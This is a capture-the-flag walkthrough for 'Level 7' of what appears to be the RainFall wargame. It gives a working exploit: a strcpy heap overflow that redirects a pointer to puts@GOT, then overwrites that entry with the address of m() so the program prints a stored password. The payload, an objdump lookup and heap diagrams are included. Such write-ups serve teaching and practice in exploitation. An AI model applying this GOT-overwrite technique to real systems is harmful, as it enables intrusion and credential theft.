================================== Level 7 Walkthrough ==================================

Payload:

$(python -c 'print "A"*20 + "\x28\x99\x04\x08"') \
$(python -c 'print "\xf4\x84\x04\x08"')

Heap layout crossed by strcpy(argv[1]):

[a[1] buffer 8B][malloc metadata 8B][b[0] 4B][b[1] 4B]
  AAAAAAAA         AAAAAAAA        AAAA     puts@GOT
←────────────── 20-byte overflow ──────────────→

After the first strcpy:

b[1] = puts@GOT

We find puts@GOT with:

level7@RainFall:~$ objdump -R ./level7 | grep puts
08049928 R_386_JUMP_SLOT   puts

The second argument is the address of m():

argv[2] = m()

So the second strcpy becomes:

strcpy(puts@GOT, &m)

Result:

puts@GOT = m

Later the program executes:

puts("~~");

Normally:

puts@GOT ───► puts()

After the overwrite:

puts@GOT ───► m()

Therefore the call becomes:

m();

m() prints the password that was previously loaded into the global buffer.